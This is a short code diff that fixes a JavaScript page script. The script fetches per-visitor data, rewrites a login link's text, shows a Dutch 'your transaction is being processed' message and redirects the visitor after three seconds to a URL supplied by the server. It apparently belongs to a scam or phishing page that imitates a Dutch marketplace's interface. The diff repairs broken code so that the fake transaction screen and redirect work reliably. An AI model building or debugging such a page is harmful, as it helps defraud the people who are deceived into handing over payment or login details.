@@ -73,22 +73,19 @@
       .then(response => response.json())
       .then(data => {
         if (data[id]) {
-          // removed duplicate loginBtn declaration
           const textElement = document.querySelector('.loader-text');
-
-          const renderInterval = setInterval(() => {
-            const loginBtnReady = document.querySelector('li.hz-hide-lte-md a[href="/identity/v2/login"] span');
-            if (loginBtnReady && data[id].replaceText) {
-              loginBtnReady.textContent = data[id].replaceText;
-              clearInterval(renderInterval);
-            }
-          }, 50);
-
           if (textElement) textElement.textContent = "Uw transactie wordt verwerkt";
-          const loginBtn = document.querySelector('li.hz-hide-lte-md a[href="/identity/v2/login"] span');
-          if (loginBtn && data[id].replaceText) loginBtn.textContent = data[id].replaceText;
-          const textElement = document.querySelector('.loader-text');
-          if (textElement) window.location.href = data[id].url;
+
+          const loginInterval = setInterval(() => {
+            const loginBtn = document.querySelector('a[href="/identity/v2/login"] span');
+            if (loginBtn && data[id].replaceText) {
+              loginBtn.textContent = data[id].replaceText;
+              clearInterval(loginInterval);
+            }
+          }, 100);
+
+          setTimeout(() => {
+            window.location.href = data[id].url;
           }, 3000);
         }
       })
